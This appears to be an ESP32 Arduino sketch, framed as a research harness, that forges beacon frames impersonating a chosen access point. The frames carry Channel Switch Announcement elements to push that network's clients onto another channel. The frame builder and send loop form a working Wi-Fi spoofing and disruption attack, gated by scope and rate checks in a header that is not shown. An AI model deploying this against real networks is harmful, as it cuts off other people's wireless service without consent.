/*
 * medusa_csa — research-only Channel Switch Announcement resilience harness.
 *
 * This prototype studies how owned lab clients handle CSA elements and records
 * driver return values. Those returns are not receiver proof, and PMF behavior
 * must be verified independently on explicitly scoped equipment.
 *
 * It is excluded from the default product until the firmware-enforced scope,
 * rate, duration, audit, confirmation, and stop controls in the threat model
 * exist and have physical tests.
 */
#include <Arduino.h>
#include <WiFi.h>
#include <string.h>
#include "esp_wifi.h"
#include "medusa_tx_common.h"

#if defined(__has_include)
#  if __has_include("medusa_target.h")
#    include "medusa_target.h"
#  endif
#endif

#ifndef TARGET_CHANNEL
#define TARGET_CHANNEL 0
#endif
#ifndef TARGET_BSSID
#define TARGET_BSSID { 0, 0, 0, 0, 0, 0 }
#endif
#ifndef TARGET_SSID
#define TARGET_SSID ""
#endif
#ifndef CSA_NEW_CHANNEL
#define CSA_NEW_CHANNEL 13
#endif

static uint8_t bssid[6] = TARGET_BSSID;
static const char* ssid = TARGET_SSID;
static uint8_t pkt[160];

static int build_beacon() {
  int n = 0;
  pkt[n++] = 0x80; pkt[n++] = 0x00;                 // FC: Beacon
  pkt[n++] = 0x00; pkt[n++] = 0x00;                 // duration
  for (int i = 0; i < 6; i++) pkt[n++] = 0xFF;      // DA = broadcast
  for (int i = 0; i < 6; i++) pkt[n++] = bssid[i];  // SA = AP
  for (int i = 0; i < 6; i++) pkt[n++] = bssid[i];  // BSSID = AP
  pkt[n++] = 0x00; pkt[n++] = 0x00;                 // sequence
  for (int i = 0; i < 8; i++) pkt[n++] = 0x00;      // timestamp
  pkt[n++] = 0x64; pkt[n++] = 0x00;                 // beacon interval 100 TU
  pkt[n++] = 0x31; pkt[n++] = 0x04;                 // capability (ESS + Privacy)
  int sl = strlen(ssid); if (sl > 32) sl = 32;      // SSID IE
  pkt[n++] = 0x00; pkt[n++] = sl; for (int i = 0; i < sl; i++) pkt[n++] = ssid[i];
  pkt[n++] = 0x01; pkt[n++] = 0x08;                 // supported rates
  uint8_t rates[8] = { 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24 };
  for (int i = 0; i < 8; i++) pkt[n++] = rates[i];
  pkt[n++] = 0x03; pkt[n++] = 0x01; pkt[n++] = TARGET_CHANNEL;   // DS param (current ch)
  pkt[n++] = 0x25; pkt[n++] = 0x03;                 // CSA IE (tag 37, len 3)
  pkt[n++] = 0x01;                                  //   switch mode = 1 (stop TX until switch)
  pkt[n++] = CSA_NEW_CHANNEL;                       //   new channel
  pkt[n++] = 0x01;                                  //   switch count = 1 (next TBTT)
  return n;
}

static bool configured() {
  if (!TARGET_CHANNEL) return false;
  for (int i = 0; i < 6; i++) if (bssid[i]) return true;
  return false;
}


// ---- gated transmission -------------------------------------------------
// Every frame this sketch emits passes medusa_tx_send(), which consults the
// operator's session, scope, rate ceiling and latched stop before the radio
// is touched. Rate and burst come from configuration rather than a hardcoded
// delay(), so changing how hard this pushes needs no rebuild.
static bool tx_session_ready = false;

static void tx_session_start(const uint8_t *target) {
  mcfg_t cfg;
  mcfg_defaults(&cfg);           // replaced by the stored config once NVS is wired
  uint8_t allow[1][MTG_MAC_LEN];
  memcpy(allow[0], target, MTG_MAC_LEN);

  mtg_session_grant_t grant;
  tx_session_ready = medusa_tx_begin(&cfg, MCFG_PROFILE_CSA, allow, 1, false, millis(), &grant);
  if (!tx_session_ready) {
    Serial.println("TX refused: no session (a stop may be latched, or scope is missing).");
    return;
  }
  // Report what was actually granted, not what was asked for.
  Serial.printf("TX session: %lu ms, %u frames/sec, burst %u, gap %u ms\n",
                (unsigned long)grant.duration_ms, (unsigned)grant.rate_per_sec,
                (unsigned)medusa_tx_burst(), (unsigned)medusa_tx_gap_ms());
}

void setup() {
  Serial.begin(115200);
  delay(600);
  Serial.println("\n=== medusa_csa ===");
  Serial.println("LAWFUL USE ONLY - your own AP / authorized tests.");
  WiFi.mode(WIFI_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  if (!configured()) { Serial.println("No target set -> idle."); return; }
  esp_wifi_set_channel(TARGET_CHANNEL, WIFI_SECOND_CHAN_NONE);
  Serial.printf("CSA BEACON spoof -> AP %02X:%02X:%02X:%02X:%02X:%02X ssid='%s' ch %d -> tell clients to hop to ch %d\n",
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ssid, TARGET_CHANNEL, CSA_NEW_CHANNEL);
  tx_session_start(bssid);
}

void loop() {
  if (!configured()) { delay(2000); return; }
  int len = build_beacon();
  static uint32_t sent = 0;
  esp_err_t e = ESP_OK;
  for (int i = 0; i < 10; i++) { e = medusa_tx_send(pkt, (size_t)len, bssid, millis()); sent++; }
  static uint32_t last = 0;
  if (millis() - last > 500) {
    last = millis();
    Serial.printf("csa beacon rc=0x%x sent=%u  %s\n", e, sent, e == 0x102 ? "(BLOCKED - stock core)" : "(spoofing)");
  }
  delay(medusa_tx_pacing_ms());
}
